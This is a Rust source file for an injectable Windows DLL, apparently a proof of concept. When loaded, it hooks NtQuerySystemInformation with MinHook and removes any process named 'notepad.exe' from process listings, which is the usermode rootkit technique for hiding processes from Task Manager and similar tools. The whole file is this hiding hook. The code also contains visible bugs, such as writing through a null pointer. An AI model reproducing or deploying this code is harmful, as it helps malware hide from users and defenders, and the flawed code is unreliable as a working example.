use anyhow::*;
use detour::static_detour;
use minhook_sys::*;
use ntapi::ntexapi::{NtQuerySystemInformation, SYSTEM_PROCESS_INFORMATION};
use winapi::{
    ctypes::c_void,
    shared::{
        minwindef::FARPROC,
        ntdef::{HANDLE, LARGE_INTEGER, NTSTATUS, PULONG, PVOID, ULONG, UNICODE_STRING},
    },
    um::{
        libloaderapi::{GetModuleHandleA, GetProcAddress},
        memoryapi::{VirtualAlloc, VirtualFree},
        winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE},
        winuser::{MessageBoxW, MB_OK},
    },
};

use std::mem::zeroed;
use std::{
    ffi::CString,
    mem::{size_of, size_of_val},
    ptr::null_mut,
};

fn e(source: &str) -> Vec<u16> {
    source.encode_utf16().chain(Some(0)).collect()
}

unsafe fn test_call() {
    let mut buffer = VirtualAlloc(
        null_mut(),
        1024 * 1024,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    let _ = NtQuerySystemInformation(0x5, buffer, 1024 * 1024, std::ptr::null_mut());
}

use std::{iter, mem};
use winapi::um::libloaderapi::GetModuleHandleW;
use winapi::um::winnt::{DLL_PROCESS_ATTACH, LPCWSTR};

static_detour! {
    static NtQuerySystemInformationHook: unsafe extern "system" fn(u32, PVOID, ULONG, PULONG) -> NTSTATUS;
}

type FnNtQuerySystemInformation = unsafe extern "system" fn(u32, PVOID, ULONG, PULONG) -> NTSTATUS;
type PNtQuerySystemInformation = *mut fn(u32, PVOID, ULONG, PULONG) -> NTSTATUS;

pub unsafe fn ntquery_hook() -> Result<()> {
    let mut target =
        get_module_symbol_address("ntdll.dll", "NtQuerySystemInformation").unwrap() as *mut c_void;

    match MH_Initialize() {
        MH_OK => {
            debug_msg("done MH init");
        }
        _ => {
            debug_msg("error MH init");
        }
    }

    let api =
        CString::new::<String>("NtQuerySystemInformation".into()).expect("CString::new failed");
    let hook_fn = detour_NtQuerySystemInformation as PNtQuerySystemInformation;

    let status = MH_CreateHookApi(
        e("ntdll.dll").as_ptr(),
        api.as_ptr(),
        hook_fn as _,
        &mut target as *const _ as _,
    );

    match status {
        MH_OK => {
            debug_msg("done MH create hook api");
        }
        _ => debug_msg(format!("could not craete hook. error code: {}", status)),
    };

    let status = MH_EnableHook(null_mut());

    match status {
        MH_OK => {
            debug_msg("done MH enable");
        }
        _ => debug_msg(format!("could not enable hook. error code: {}", status)),
    };

    //NtQuerySystemInformationHook.initialize(target, detour_NtQuerySystemInformation)?.enable()?;
    Ok(())
}

fn debug_msg(msg: impl Into<String>) {
    unsafe {
        MessageBoxW(
            std::ptr::null_mut(),
            e(&msg.into()).as_ptr(),
            e("Hello ♡").as_ptr(),
            MB_OK,
        );
    }
}

fn detour_NtQuerySystemInformation(
    sys_info_class: u32,
    sys_info: PVOID,
    sys_info_length: ULONG,
    return_length: PULONG,
) -> NTSTATUS {
    let OrigNtQuerySystemInformation: PNtQuerySystemInformation =
        get_module_symbol_address("ntdll.dll", "NtQuerySystemInformation").unwrap() as *mut _;
    let status = unsafe {
        (*OrigNtQuerySystemInformation)(sys_info_class, sys_info, sys_info_length, return_length)
    };

    if sys_info_class == 0x5 {
        let p_current: *mut SYSTEM_PROCESS_INFORMATION = null_mut();
        let mut p_next = unsafe { std::ptr::read::<SYSTEM_PROCESS_INFORMATION>(sys_info as _) };

        unsafe {
            loop {
                *p_current = p_next;
                if (*p_current).NextEntryOffset == 0x0 {
                    break;
                }

                p_next = std::ptr::read::<SYSTEM_PROCESS_INFORMATION>(
                    (sys_info as usize + p_next.NextEntryOffset as usize) as *const _,
                );

                let image_name = std::slice::from_raw_parts(
                    p_next.ImageName.Buffer,
                    p_next.ImageName.Length as usize,
                );
                let detect_image_name = e("notepad.exe");

                if image_name == detect_image_name {
                    if p_next.NextEntryOffset == 0x0 {
                        (*p_current).NextEntryOffset = 0x0;
                    } else {
                        (*p_current).NextEntryOffset =
                            (*p_current).NextEntryOffset + p_next.NextEntryOffset;
                    }

                    p_next = *(p_current);
                }
            }
        }
    }

    status
}

fn get_module_function<T>(module: &str, symbol: &str) -> Result<T> {
    let func_address = get_module_symbol_address(module, symbol);
    if func_address.is_none() {
        bail!(
            "could not find function. module_name: {}, symbol_name: {}",
            module,
            symbol
        )
    }
    Ok(unsafe { mem::transmute_copy::<usize, T>(&func_address.unwrap()) } as T)
}

fn get_module_symbol_address(module: &str, symbol: &str) -> Option<usize> {
    let module = e(module);
    let symbol = CString::new(symbol).unwrap();
    unsafe {
        let handle = GetModuleHandleW(module.as_ptr());
        match GetProcAddress(handle, symbol.as_ptr()) as usize {
            0 => None,
            n => Some(n),
        }
    }
}

use winapi::shared::minwindef::{BOOL, DWORD, HINSTANCE, LPVOID, TRUE};
#[no_mangle]
#[allow(non_snake_case)]
pub unsafe extern "system" fn DllMain(
    _module: HINSTANCE,
    call_reason: DWORD,
    _reserved: LPVOID,
) -> BOOL {
    if call_reason == DLL_PROCESS_ATTACH {
        // A console may be useful for printing to 'stdout'
        // winapi::um::consoleapi::AllocConsole();

        // Preferably a thread should be created here instead, since as few
        // operations as possible should be performed within `DllMain`.
        ntquery_hook().is_ok() as BOOL
    } else {
        TRUE
    }
}
